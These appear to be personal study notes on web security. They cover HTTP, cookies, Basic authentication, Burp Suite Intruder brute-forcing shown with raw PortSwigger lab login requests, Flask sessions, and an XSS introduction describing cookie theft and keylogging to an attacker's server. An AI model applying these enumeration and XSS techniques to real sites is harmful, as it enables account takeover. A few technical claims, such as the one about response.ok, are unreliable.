![image-20240505185654461](C:\Users\89388\AppData\Roaming\Typora\typora-user-images\image-20240505185654461.png)

![image-20240505185957173](C:\Users\89388\AppData\Roaming\Typora\typora-user-images\image-20240505185957173.png)

![image-20240505185938760](C:\Users\89388\AppData\Roaming\Typora\typora-user-images\image-20240505185938760.png)







#### DOM跳转

https://blog.csdn.net/weixin_49125123/article/details/131546660

![image-20240505190537307](C:\Users\89388\AppData\Roaming\Typora\typora-user-images\image-20240505190537307.png)

`location.search`获取查询字符串部分 ， split方法将字符串拆分为参数名和参数值的数组。

example :

`jumpto=http://challenge1ccc67ea8612a9b6.sandbox[ctfhub(https://so.csdn.net/so/searchq=ctfhub&spm=1001.2101.3001.7020).com:10800/`）

`target[0].slice(1)`=="jumpto"，target[0]包含"?“字符，使用`.slice(1)`去掉”?"。

如果相等，就使用`location.href`将页面重定向到`target[1]`，也就是参数值所指定的URL。



![image-20240505192740432](C:\Users\89388\AppData\Roaming\Typora\typora-user-images\image-20240505192740432.png)

![image-20240505192705892](C:\Users\89388\AppData\Roaming\Typora\typora-user-images\image-20240505192705892.png)













# HTTP



## HTTP message structure

two types of messages: requests and responses

Web developers rarely craft these textual HTTP messages themselves: software, a Web browser, proxy, or Web server, perform this action. They provide HTTP messages through config files (for proxies or servers), APIs (for browsers), or other interfaces.

![image-20240503214006944](C:\Users\89388\AppData\Roaming\Typora\typora-user-images\image-20240503214006944.png)

HTTP/1.x messages have a few drawbacks for performance:

- Headers, unlike bodies, are uncompressed.
- Headers are often very similar from one message to the next one, yet still repeated across connections.
- Although HTTP/1.1 has [pipelining](https://developer.mozilla.org/en-US/docs/Web/HTTP/Connection_management_in_HTTP_1.x#http_pipelining), it's not activated by default in most browsers, and doesn't allow for multiplexing (i.e. sending requests concurrently). Several connections need opening on the same server to send requests concurrently; and warm TCP connections are more efficient than cold ones.

HTTP/2 introduces an extra step: it divides HTTP/1.x messages into frames which are embedded in a stream. Data and header frames are separated, which allows header compression. Several streams can be combined together, a process called *multiplexing*, allowing more efficient use of underlying TCP connections.





HTTP requests, and responses, share similar structure : 

1. request-line

   describing the requests to be implemented, or its status of whether successful or a failure.  always a single line.

2. An optional set of HTTP headers

   specifying the request, or describing the body included in the message.

3. A blank line 

   indicating all meta-information for the request has been sent.

4. An optional body

   containing data associated with the request (like content of an HTML form), or the document associated with a response. The presence of the body and its size is specified by the start-line and HTTP headers.





### request-line

*request-line* contain three elements:

1. An *[HTTP method](https://developer.mozilla.org/en-US/docs/Web/HTTP/Methods)*

    GET, PUT,  POST, HEAD,  OPTIONS

   describes the action to be performed

2. The *request target*, 

   usually a [URL](https://developer.mozilla.org/en-US/docs/Glossary/URL), or the absolute path of the protocol, port, and domain are usually characterized by the request context. The format of this request target varies between different HTTP methods. It can be

   - An absolute path, ultimately followed by a `'?'` and query string. 

     This is the most common form, known as the ***origin form***,  used with `GET`, `POST`, `HEAD`, and `OPTIONS` methods

     - `POST / HTTP/1.1`
     - `GET /backgroud.png HTTP/1.0`
     - `HEAD /test.html?query=alibaba HTTP/1.1`

   - A complete URL, known as the ***absolute form***,

     mostly used with `GET` when connected to a proxy. `GET https://developer.mozilla.org/en-US/docs/Web/HTTP/Messages HTTP/1.1`

   - The authority component of a URL, consisting of the domain name and optionally the port (prefixed by a `':'`), called the ***authority form***. 

      only used with `CONNECT` when setting up an HTTP tunnel. `CONNECT developer.mozilla.org:80 HTTP/1.1`

3. The *HTTP version*, 

    defines the structure of the remaining message, acting as an indicator of the expected version to use for the response.



## header

Many different headers can appear in requests. They can be divided in several groups:

- [General headers](https://developer.mozilla.org/en-US/docs/Glossary/General_header), like [`Via`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Via), apply to the message as a whole.
- [Request headers](https://developer.mozilla.org/en-US/docs/Glossary/Request_header), like [`User-Agent`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/User-Agent) or [`Accept`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Accept), modify the request by specifying it further (like [`Accept-Language`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Accept-Language)), by giving context (like [`Referer`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Referer)), or by conditionally restricting it (like [`If-None-Match`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/If-None-Match)).
- [Representation headers](https://developer.mozilla.org/en-US/docs/Glossary/Representation_header) like [`Content-Type`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Type) that describe the original format of the message data and any encoding applied (only present if the message has a body).











### Host

`Host: <host>:<port>`

**Host** 请求头指明了请求将要发送到的服务器主机名和端口号。

如果没有包含端口号，会自动使用被请求服务的默认端口（比如 HTTPS URL 使用 443 端口，HTTP URL 使用 80 端口）。

所有 HTTP/1.1 请求报文中必须包含一个`Host`头字段。对于缺少`Host`头或者含有超过一个`Host`头的 HTTP/1.1 请求，可能会收到[`400`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Status/400)（Bad Request）状态码。





## HTTP Cookies

Cookies are little text-based files that are kept on the user's computer and are accessible only by that user's browser. It is possible for a cookie's size to reach a maximum of 4 KB. 

It remembers stateful information for the [stateless](https://developer.mozilla.org/en-US/docs/Web/HTTP/Overview#http_is_stateless_but_not_sessionless) HTTP protocol.



**Cookies are mainly used for three purposes:**

- Session management

  Logins, shopping carts, game scores, or anything else the server should remember

- Personalization

  User preferences, themes, and other settings

- Tracking

  Recording and analyzing user behavior



Modern APIs for client storage are the [Web Storage API](https://developer.mozilla.org/en-US/docs/Web/API/Web_Storage_API) (`localStorage` and `sessionStorage`) and [IndexedDB](https://developer.mozilla.org/en-US/docs/Web/API/IndexedDB_API).



### The `Set-Cookie` and `Cookie` headers

The [`Set-Cookie`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie) HTTP response header sends cookies from the server to the user agent. A simple cookie is set like this:

```http
Set-Cookie: <cookie-name>=<cookie-value>
```



example:

```http
HTTP/2.0 200 OK
Content-Type: text/html
Set-Cookie: yummy_cookie=choco
Set-Cookie: tasty_cookie=strawberry

[page content]
```

Then, with every subsequent request to the server, the browser sends all previously stored cookies back to the server using `Cookie` header.

```http
GET /sample_page.html HTTP/2.0
Host: www.example.org
Cookie: yummy_cookie=choco; tasty_cookie=strawberry
```







### lifetime 

Cookies can persist for two different periods, depending on the attributes used with the `Set-Cookie` header 



- *Permanent* cookies are deleted at a date specified by the `Expires`  or  `Max-Age` attribute.

- *Session* cookies – cookies without a `Max-age` or `Expires` attribute – are deleted when the current session ends. The browser defines when the "current session" ends, and some browsers use *session restoring* when restarting. This can cause session cookies to last indefinitely.

  If your site authenticates users, it should regenerate and resend session cookies, even ones that already exist, whenever a user authenticates. This approach helps prevent [session fixation attacks](https://developer.mozilla.org/en-US/docs/Web/Security/Types_of_attacks#session_fixation), where a third party can reuse a user's session.



### Restrict access to cookies

ensure that cookies are sent securely and aren't accessed by unintended parties or scripts in one of two ways: 

-   `Secure` attribute
-   `HttpOnly` attribute.



**`Secure`**

A cookie with the `Secure` attribute is only sent to the server with an encrypted request over the HTTPS protocol.

It's never sent with unsecured HTTP (except on localhost), which means [man-in-the-middle](https://developer.mozilla.org/en-US/docs/Glossary/MitM) attackers can't access it easily. 

 Insecure sites (with `http:` in the URL) can't set cookies with the `Secure` attribute. However, don't assume that `Secure` prevents all access to sensitive information in cookies. For example, someone with access to the client's hard disk (or JavaScript if the `HttpOnly` attribute isn't set) can read and modify the information.



**`HttpOnly`**

A cookie with the `HttpOnly` attribute is inaccessible to the JavaScript [`Document.cookie`](https://developer.mozilla.org/en-US/docs/Web/API/Document/cookie) API; it's only sent to the server. 

 For example, cookies that persist in server-side sessions don't need to be available to JavaScript and should have the `HttpOnly` attribute. This precaution helps mitigate cross-site scripting ([XSS](https://developer.mozilla.org/en-US/docs/Web/Security/Types_of_attacks#cross-site_scripting_xss)) attacks.





```http
Set-Cookie: id=a3fWa; Expires=Thu, 21 Oct 2021 07:28:00 GMT; Secure; HttpOnly
```





### Define where cookies are sent

The `Domain` and `Path` attributes define the *scope* of a cookie: what URLs the cookies should be sent to.



**`Domain`**

The `Domain` attribute specifies which server can receive a cookie.

If specified, then cookies are available on the server and its subdomains. For example, if you set `Domain=mozilla.org`, cookies are available on mozilla.org and its subdomains like `developer.mozilla.org`.

If the server does not specify a `Domain`, the cookies are available on the server *but not on its subdomains*. 



**`Path`**

The `Path` attribute indicates a URL path that must exist in the requested URL in order to send the `Cookie` header.

- default value

  If the `Path` attribute is not set, its default value is computed from the [path](https://developer.mozilla.org/en-US/docs/Learn/Common_questions/Web_mechanics/What_is_a_URL#path_to_resource) of the URI that set the cookie

  - If the path is empty, does not start with `"/"`, or contains no more than one `"/"` character, then the default value for `Path` is `"/"`.
  - Otherwise, the default value for `Path` is the path from the start up to but not including the final `"/"` character.

  example, if the cookie was set from `"https://example.org/a/b/c`, then the default value of `Path` would be `"/a/b"`.



### SameSite attribute

The [`SameSite`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie#samesitesamesite-value) attribute lets servers specify whether/when cookies are sent with cross-site requests (where [Site](https://developer.mozilla.org/en-US/docs/Glossary/Site) is defined by the registrable domain and the *scheme*: http or https). This provides some protection against cross-site request forgery attacks ([CSRF](https://developer.mozilla.org/en-US/docs/Glossary/CSRF)). It takes three possible values: `Strict`, `Lax`, and `None`.

With `Strict`, the browser only sends the cookie with requests from the cookie's origin site. `Lax` is similar, except the browser also sends the cookie when the user *navigates* to the cookie's origin site (even if the user is coming from a different site). For example, by following a link from an external site. `None` specifies that cookies are sent on both originating and cross-site requests, but *only in secure contexts* (i.e., if `SameSite=None` then the `Secure` attribute must also be set). If no `SameSite` attribute is set, the cookie is treated as `Lax`.



## Session 

pass the session IDs as **a parameter in URLs or store them in the cookies**. 



**Usage**

- display a user’s preferences throughout the site. 
-  remember shopping cart  between pages
-  implement security measures and perform certain actions.



**How Do Web Sessions Work**

![image-20240502094209124](C:\Users\89388\AppData\Roaming\Typora\typora-user-images\image-20240502094209124.png)



**Difference between Cookies and Session**

| Session                                                      | Cookies                                                      |
| :----------------------------------------------------------- | :----------------------------------------------------------- |
| A session stores the variables and their values within a file in a temporary directory on the server. | Cookies are stored on the user's computer as a text file.    |
| The session ends when the user logout from the application or closes his web browser. | Cookies end on the lifetime set by the user.                 |
| It can store an unlimited amount of data.                    | It can store only limited data.                              |
| We can store as much data as we want within a session, but there is a maximum memory limit, which a script can use at one time, and it is 128 MB. | The maximum size of the browser's cookies is 4 KB.           |
| We need to call the session_start() function to start the session. | We don't need to call a function to start a cookie as it is stored within the local computer. |
| In PHP, to destroy or remove the data stored within a session, we can use the session_destroy() function, and to unset a specific variable, we can use the unset() function. | We can set an expiration date to delete the cookie's data. It will automatically delete the data at that specific time. There is no particular function to remove the data. |
| Sessions are more secured compared to cookies, as they save data in encrypted form. | Cookies are not secure, as data is stored in a text file, and if any unauthorized user gets access to our system, he can temper the data. |



## HTTP basic authentication

https://en.wikipedia.org/wiki/Basic_access_authentication

a method for an HTTP user agent (e.g. a web browser) to provide a user name and password when making a request. In basic HTTP authentication, a request contains a header field in the form of `Authorization: Basic <credentials>`, where `<credentials>` is the Base64 encoding of ID and password joined by a single colon `:`.

HTTP Basic authentication (BA) implementation is the simplest technique for enforcing access controls to web resources because it does not require cookies, session identifiers, or login pages; rather, HTTP Basic authentication uses standard fields in the HTTP header.



#### framework

[RFC 7235](https://datatracker.ietf.org/doc/html/rfc7235) defines the HTTP authentication framework, which can be used by a server to [challenge](https://developer.mozilla.org/en-US/docs/Glossary/Challenge) a client request, and by a client to provide authentication information.

1. The server responds to a client with a [`401`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Status/401) (Unauthorized) response status and provides information on how to authorize with a [`WWW-Authenticate`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/WWW-Authenticate) response header containing at least one challenge.
2. A client that wants to authenticate include an [`Authorization`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Authorization) request header with credentials.
3. Usually a client will present a password prompt to the user and will then issue the request including the correct `Authorization` header.

![A sequence diagram illustrating HTTP messages between a client and a server lifeline.](https://developer.mozilla.org/en-US/docs/Web/HTTP/Authentication/http-auth-sequence-diagram.png)

**Warning:** The "Basic" authentication scheme used in the diagram above sends the credentials encoded but not encrypted. This would be completely insecure unless the exchange was over a secure connection (HTTPS/TLS).



If a (proxy) server receives valid credentials that are *inadequate* to access a given resource, the server should respond with the [`403`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Status/403) `Forbidden` status code. Unlike [`401`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Status/401) `Unauthorized` or [`407`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Status/407) `Proxy Authentication Required`, authentication is impossible for this user and browsers will not propose a new attempt.

In all cases, the server may prefer returning a [`404`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Status/404) `Not Found` status code, to hide the existence of the page to a user without adequate privileges or not correctly authenticated.



### protocol







#### WWW-Authenticate

When the server wants the user agent to authenticatet, it must send a response with a ***HTTP 401** Unauthorized* status line and a ***WWW-Authenticate*** header field

- syntax: `"WWW-Authenticate: <type> realm=<realm>"`
  - `<type>` is the authentication scheme ( "Basic" is the most common scheme ). 
  - The *`realm`* is used to describe the protected area or to indicate the scope of protection. This could be a message like "Access to the staging site" or similar, so that the user knows to which space they are trying to get access to.



#### Authorization

The **`Authorization`** header is usually, but not always, sent after the user agent first attempts to request a protected resource without credentials. 





- **syntax** : `Authorization: <auth-scheme> <authorization-parameters>`

  - `<auth-scheme>`

    The [Authentication scheme](https://developer.mozilla.org/en-US/docs/Web/HTTP/Authentication#authentication_schemes) that defines how the credentials are encoded. Some of the more common types are (case-insensitive): `Basic`, `Digest`, `Negotiate` and `AWS4-HMAC-SHA256`.

    - Basic authentication

      `Authorization: Basic <credentials>`

    - Digest(摘要) authentication

      ```
      Authorization: Digest username=<username>,
          realm="<realm>",
          uri="<url>",
          algorithm=<algorithm>,
          nonce="<nonce>",
          nc=<nc>,
          cnonce="<cnonce>",
          qop=<qop>,
          response="<response>",
          opaque="<opaque>"
      ```

      

##### Basic authentication

1. The username and password are combined with a single colon (:) 

2. The resulting string is encoded into an octet sequence. 

   The character set is by default unspecified, as long as it is compatible with US-ASCII, but the server may suggest use of UTF-8 by sending the ***charset*** parameter.

3. The resulting string is encoded using a variant of Base64 (+/ and with padding).

4. The authorization method and a space character (e.g. **"Basic "**) is then prepended to the encoded string.

- For example, if the browser uses *Aladdin* as the username and *open sesame* as the password

  field's value :  Base64 encoding of *`Aladdin:open sesame`*, *QWxhZGRpbjpvcGVuIHNlc2FtZQ==*. 

   *Authorization* header field  :`Authorization: Basic QWxhZGRpbjpvcGVuIHNlc2FtZQ==`









# Guide to Developer Tools

https://developer.chrome.com/docs/devtools/overview?hl=zh-cn

## The tabs are:

- Elements : shows you the HTML used to build the page you’re looking at, together with any inline CSS.
- Console : deals with JavaScript. It gives you information about interactive elements on a page. In Console, you can write JavaScript to interact with the web page you’re viewing, and it also lets you write messages to yourself in the JavaScript of websites you’re building, which then show up in Console to show that the JS was executed.
- Source : shows you where all the files that were used to make the website are stored and lets you inspect them.
- Network : shows you all the files that are loading in the URL you’re looking at . You get a waterfall and deep data on all the items loaded, including initiator and time to load that element.
- Application : shows you what’s in your browser storage: in-browser databases like Web SQL, local storage, and more. It also gives you granular control over your cookies.
- Security
- Memory
- Performance
- Audits



**Important**:

You can’t change the code on the website with Developer Tools. You’d need access to the site’s backend for that. Only the code your browser uses to display the website is changed. So even if you’re a total beginner, you can do anything you like with Developer Tools with no real risk. Close the window, go back to the website, and everything is the same as it was before.



**How to open Chrome Developer Tools**



1. The keyboard shortcuts are:

   - Mac OS: **CMD+Shift+J** or **CMD+Shift+C**

   - Linux, Chromebook and Windows: **Ctrl+Shift+J**

2. From the Chrome menu:

   Open the Chrome menu and go to “More Tools” > “Developer Tools.”

3. right-click (Windows) or Ctrl-click (Mac) anything on a web page and select “Inspect Element” to open Developer Tools.



# burpsuite



## Tools

**modify HTTP requests**

https://portswigger.net/burp/documentation/desktop/getting-started/modifying-http-requests



### **target**

https://portswigger.net/burp/documentation/desktop/tools/target

The target scope tells Burp exactly which URLs and hosts you want to test. This enables you to filter out the noise generated by your browser and other sites, so you can focus on the traffic that you're interested in.



#### Site map

The site map shows the information that Burp collects as you explore your target application. It builds a hierarchical representation of the content from a number of sources. These include information from scans, and the URLs you discover as you browse the target manually. You can also see:

- A list of the contents.
- Full requests and responses for individual items.
- Full information about any security issues that Burp discovers.



### Intruder

performing highly customizable, automated attacks against websites. It enables you to configure attacks that send the same request over and over again, inserting different payloads into predefined positions each time. Among other things, you can use Intruder to:

- Fuzz for input-based vulnerabilities.
- Perform brute-force attacks.
- Enumerate valid identifiers and other inputs.
- Harvest useful data.

https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-different-responses



- configure your attack to enumerate a huge variety of identifiers, for example:

  - Enumerate usernames - Use the username generator payload type to insert a long list of possible usernames into an application's login failure message.

  - Enumerate passwords - Use the simple list payload type to insert a set of common passwords into an application's login failure message, alongside known valid usernames.

  - Enumerate order IDs - Use the custom iterator payload type to cycle through potential order IDs in a known format. You can then use these to view order details.

  - Enumerate session tokens - Use the bit flipper payload type to systematically modify a token that has been encrypted using a CBC cipher, to try to meaningfully tamper with its decrypted value.





#### **example :**

![image-20240428161015073](C:\Users\89388\AppData\Roaming\Typora\typora-user-images\image-20240428161015073.png)



1. `GET /`

   ```http
   GET / HTTP/1.1
   Host: 0aa0000e037c1b1b807bee3c00060046.web-security-academy.net
   Upgrade-Insecure-Requests: 1
   User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.122 Safari/537.36
   Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
   Sec-Fetch-Site: cross-site
   Sec-Fetch-Mode: navigate
   Sec-Fetch-User: ?1
   Sec-Fetch-Dest: document
   Sec-Ch-Ua: "Chromium";v="123", "Not:A-Brand";v="8"
   Sec-Ch-Ua-Mobile: ?0
   Sec-Ch-Ua-Platform: "Windows"
   Referer: https://portswigger.net/
   Accept-Encoding: gzip, deflate, br
   Accept-Language: zh-CN,zh;q=0.9
   Priority: u=0, i
   Connection: close
   ```

Response :

```http
HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
Set-Cookie: session=neOMJZ80oLRUkvOqqAo9VCzwBVc7g2Dh; Secure; HttpOnly; SameSite=None
X-Frame-Options: SAMEORIGIN
Content-Length: 8384

content ...
```



2. `GET /login`

   ```http
   GET /login HTTP/2
   Host: 0aa0000e037c1b1b807bee3c00060046.web-security-academy.net
   Cookie: session=neOMJZ80oLRUkvOqqAo9VCzwBVc7g2Dh
   Upgrade-Insecure-Requests: 1
   User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.122 Safari/537.36
   Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
   Sec-Fetch-Site: same-origin
   Sec-Fetch-Mode: navigate
   Sec-Fetch-User: ?1
   Sec-Fetch-Dest: document
   Sec-Ch-Ua: "Chromium";v="123", "Not:A-Brand";v="8"
   Sec-Ch-Ua-Mobile: ?0
   Sec-Ch-Ua-Platform: "Windows"
   Referer: https://0aa0000e037c1b1b807bee3c00060046.web-security-academy.net/
   Accept-Encoding: gzip, deflate, br
   Accept-Language: zh-CN,zh;q=0.9
   Priority: u=0, i
   
   
   ```

   response

   ```http
   HTTP/2 200 OK
   Content-Type: text/html; charset=utf-8
   X-Frame-Options: SAMEORIGIN
   Content-Length: 3075
   ```

   

3. `POST /login`

   ```http
   POST /login HTTP/2
   Host: 0aa0000e037c1b1b807bee3c00060046.web-security-academy.net
   Cookie: session=neOMJZ80oLRUkvOqqAo9VCzwBVc7g2Dh
   Content-Length: 29
   Cache-Control: max-age=0
   Sec-Ch-Ua: "Chromium";v="123", "Not:A-Brand";v="8"
   Sec-Ch-Ua-Mobile: ?0
   Sec-Ch-Ua-Platform: "Windows"
   Upgrade-Insecure-Requests: 1
   Origin: https://0aa0000e037c1b1b807bee3c00060046.web-security-academy.net
   Content-Type: application/x-www-form-urlencoded
   User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.122 Safari/537.36
   Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
   Sec-Fetch-Site: same-origin
   Sec-Fetch-Mode: navigate
   Sec-Fetch-User: ?1
   Sec-Fetch-Dest: document
   Referer: https://0aa0000e037c1b1b807bee3c00060046.web-security-academy.net/login
   Accept-Encoding: gzip, deflate, br
   Accept-Language: zh-CN,zh;q=0.9
   Priority: u=0, i
   
   username=wiener&password=xccc
   ```



4. use intruder

   ![image-20240428163701471](C:\Users\89388\AppData\Roaming\Typora\typora-user-images\image-20240428163701471.png)

![image-20240428170759962](C:\Users\89388\AppData\Roaming\Typora\typora-user-images\image-20240428170759962.png)



















**reissue requests** 

This lets you study the target website's response to different input without having to intercept the request each time.





















# python lib

```python
import urllib.request
import json

url = 'http://example.com/api/data'
data = {'key': 'value'}

# 将数据编码为 JSON 格式
data = json.dumps(data).encode('utf-8')

req = urllib.request.Request(url, data=data, headers={'Content-Type': 'application/json'})

with urllib.request.urlopen(req) as response:
    result = response.read().decode('utf-8')
    print(result)
```



## requests



### `get()` method

`requests.get(url, params={key, value}, args)`



#### Parameters

| *url*           | Required. The url of the request                             |
| --------------- | ------------------------------------------------------------ |
| params          | Optional. A dictionary, list of tuples or bytes to send as a query string. Default `None` |
| allow_redirects | Optional. A Boolean to enable/disable redirection. Default `True` (allowing redirects) |
| auth            | Optional. A tuple to enable a certain HTTP authentication. Default `None`                                                                                                                   `x = requests.get(url, auth = ('user', 'pass'))` |
| cert            | Optional. A String or Tuple specifying a cert file or key. Default `None` |
| cookies         | Optional. A dictionary of cookies to send to the specified url. Default `None `                                                                                                                  `x = requests.get(url, cookies = {"favcolor": "Red"})` |
| headers         | Optional. A dictionary of HTTP headers to send to the specified url. Default `None`                                                                                                    `x = requests.get(url, headers = {"HTTP_HOST": "MyVeryOwnHost"})` |
| proxies         | Optional. A dictionary of the protocol to the proxy url. Default `None` |
| stream          | Optional. A Boolean indication if the response should be immediately downloaded (False) or streamed (True). Default `False` |
| timeout         | Optional. A number, or a tuple, indicating how many seconds to wait for the client to make a connection and/or send a response. Default `None` which means the request will continue until the connection is closed |
| verify          | Optional. A Boolean or a String indication to verify the servers TLS certificate or not. Default `True` |

**return value**

The get() method returns a `requests.Response object`





#### Authentication using Requests

https://www.geeksforgeeks.org/authentication-using-python-requests/

provides authentication data through Authorization header or a custom header defined by server.

```python
from requests.auth import HTTPBasicAuth 
# Making a get request 
response = requests.get('https://api.github.com / user, ', 
            auth = HTTPBasicAuth('user', 'pass')) 
# Replace “user” and “pass” with your username and password. It will authenticate the request and return a response 200 or else it will return error 403.
```







### Response object

When one makes a request to a URI, it returns a response. This Response object in terms of python is returned by requests.method(), method being – get, post, put, etc. 



#### Response Methods



|             Method             |                         Description                          |
| :----------------------------: | :----------------------------------------------------------: |
|        response.headers        |  response.headers returns a dictionary of response headers.  |
|       response.encoding        | response.encoding returns the encoding used to decode response.content. |
|        response.elapsed        | response.elapsed returns a timedelta object with the time elapsed from sending the request to the arrival of the response. |
|        response.close()        |    response.close() closes the connection to the server.     |
|        response.content        | response.content returns the content of the response, in bytes. |
|        response.cookies        | response.cookies returns a CookieJar object with the cookies sent back from the server. |
|        response.history        | response.history returns a list of response objects holding the history of request (url). |
| response.is_permanent_redirect | response.is_permanent_redirect returns True if the response is the permanent redirected url, otherwise False. |
|      response.is_redirect      | response.is_redirect returns True if the response was redirected, otherwise False. |
|    response.iter_content()     | response.iter_content() iterates over the response.content.  |
|        response.json()         | response.json() returns a JSON object of the result (if the result was written in JSON format, if not it raises an error). |
|          response.url          |        response.url returns the URL of the response.         |
|         response.text          | response.text returns the content of the response, in unicode. |
|      response.status_code      | response.status_code returns a number that indicates the status (200 is OK, 404 is Not Found). |
|        response.request        | response.request returns the request object that requested this response. |
|        response.reason         | response.reason returns a text corresponding to the status code. |
|          response.ok           | response.ok returns True if status_code is less than 200, otherwise False. |
|         response.links         |           response.links returns the header links.           |





### Session objects

Session object allows one to persist(保持) certain parameters across requests. It also persists cookies across all requests made from the Session instance and will use urllib3’s connection pooling. So if several requests are being made to the same host, the underlying TCP connection will be reused, which can result in a significant performance increase. A session object all the methods as of requests.

```python
import requests

s = requests.Session()

# make a get request 
s.get('https://httpbin.org/cookies/set/sessioncookie/123456789') 
  
# again make a get request 
r = s.get('https://httpbin.org/cookies') 


```









# Flask



## Flask-session



### Introduction

- **Client-side vs Server-side sessions**

  - **Client-side sessions** store session data in the client’s browser. This is done by placing it in a cookie that is sent to and from the client on each request and response. This can be any small, basic information about that client or their interactions for quick retrieval 

  - **Server-side sessions** storing session data in server-side . A cookie is also used, but it only contains the session identifier that links the client to their corresponding data on the server.



**Flask-Session sequence diagram**

![sequence diagram for flask-session](https://flask-session.readthedocs.io/en/latest/_images/sequence.webp)



### modify session data

https://overiq.com/flask-101/sessions-in-flask/

When we use sessions the data is stored in the browser as a cookie. The cookie used to store session data is known session cookie. However, unlike an ordinary cookie, Flask Cryptographically signs the session cookie. It means that anyone can view the contents of the cookie, but can't modify the cookie unless he has the secret key used to sign the cookie.

That's why it is recommended to set a long and hard to guess string as a secret key. Once the session cookie is set, every subsequent request to the server verifies the authenticity of the cookie by unsigning it using the same secret key. If Flask fails to unsign the cookie then its content is discarded and a new session cookie is sent to the browser.



**PHP vs Flask**

 In PHP, session cookie doesn't store session data instead it only stores a session id. The session id is a unique string PHP creates to associate session data with the cookie. The session data itself is stored on the server in a file. Upon receiving a request from the client, PHP uses the session id to retrieve session data and makes it available in your code. This type of sessions is known as server-side sessions and type of sessions Flask provides by default is known as client-side sessions.

By default, there isn't much difference between cookies and client-based sessions in Flask. As a result, the client-based sessions suffer from the same drawbacks the cookies have like:

- Can't store sensitive data like passwords.
- Additional payload on every request.
- Can't store data more than 4KB.
- Limit on the number of cookie per website and so on.

The only real difference between cookies and the client-based session is that Flask guarantees that the contents of the session cookie is not tempered by the user (unless he has the secret key).

If you want to use server-side sessions in Flask, you can either write your own session interface or use extensions like Flask-Session and Flask-KVSession.



```python
@app.route('/visits-counter/')
def visits():
    if 'visits' in session:
        session['visits'] = session.get('visits') + 1
    else:
        session['visits'] = 1
    return "Total visits: {}".format(session.get('visits'))

@app.route('/delete-visits/')
def delete_visits():
    session.pop('visits', None)
    return 'Visits deleted'
```











### Session object

Assign session IDs to sessions for each client. Session data is stored at the top of the cookie, and the server signs it in encrypted mode.For this encryption, the Flask application requires a defined `SECRET_KEY`.



- A Session object is a dictionary object that contains key value pairs for session variables and associated values. `session['username'] = 'admin'`

- To release a session variable, use the `pop()` method.

  `session.pop('username', None)`



example:

```python
@app.route('/')
def index():
   if 'username' in session:
      username = session['username']
      return 'Logged in as ' + username + '<br>' + "<b><a href = '/logout'>click here to log out</a></b>"
   return "You are not logged in <br><a href = '/login'>" + "click here to log in</a>"


@app.route('/login', methods = ['GET', 'POST'])
def login():
   if request.method == 'POST':
      session['username'] = request.form['username']
      return redirect(url_for('index'))

@app.route('/logout')
def logout():
   # remove the username from the session if it is there
   session.pop('username', None)
   return redirect(url_for('index'))
```



Run the application and access the home page.(Ensure that the application’s secrett_key is set)

```
from flask import Flask, session, redirect, url_for, escape, request
app = Flask(__name__)
app.secret_key = 'any random string’
```







# XSS

## Introduction

### malicious javascript

- JavaScript has access to some of the user's sensitive information, such as cookies.
- JavaScript can send HTTP requests with arbitrary content to arbitrary destinations by using `XMLHttpRequest` and other mechanisms.
- JavaScript can make arbitrary modifications to the HTML of the current page by using DOM manipulation methods.



*the ability to execute arbitrary JavaScript in another user's browser allows an attacker to perform the following types of attacks:*

**Cookie theft**

The attacker can access the victim's cookies associated with the website using `document.cookie`, send them to his own server, and use them to extract sensitive information like session IDs.

**Keylogging**

The attacker can register a keyboard event listener using `addEventListener` and then send all of the user's keystrokes to his own server, potentially recording sensitive information such as passwords and credit card numbers.

**Phishing**

The attacker can insert a fake login form into the page using DOM manipulation, set the form's `action` attribute to target his own server, and then trick the user into submitting sensitive information.



### Actors in an XSS attack

Cross-site scripting works by manipulating a vulnerable web site so that it returns malicious JavaScript to users. When the malicious code executes inside a victim's browser, the attacker can fully compromise( 破坏 ) their interaction with the application.

![image-20240504183834667](C:\Users\89388\AppData\Roaming\Typora\typora-user-images\image-20240504183834667.png)

In general, an XSS attack involves three actors: **the website**, **the victim**, and **the attacker**.

- **The website** serves HTML pages to users who request them. In our examples, it is located at `http://website/`.
  - **The website's database** is a database that stores some of the user input included in the website's pages.
- **The victim** is a normal user of the website who requests pages from it using his browser.
- **The attacker** is a malicious user of the website who intends to launch an attack on the victim by exploiting an XSS vulnerability in the website.
  - **The attacker's server** is a web server controlled by the attacker for the sole purpose of stealing the victim's sensitive information. In our examples, it is located at `http://attacker/`.









## Types of XSS

https://edricteo.com/xss/

- **Stored XSS** −  also known as persistent XSS 

  occurs when user input is stored on the target server such as database/message forum/comment field etc. Then the victim is able to retrieve the stored data from the web application.

- **Reflected XSS** −  also known as non-persistent XSS 

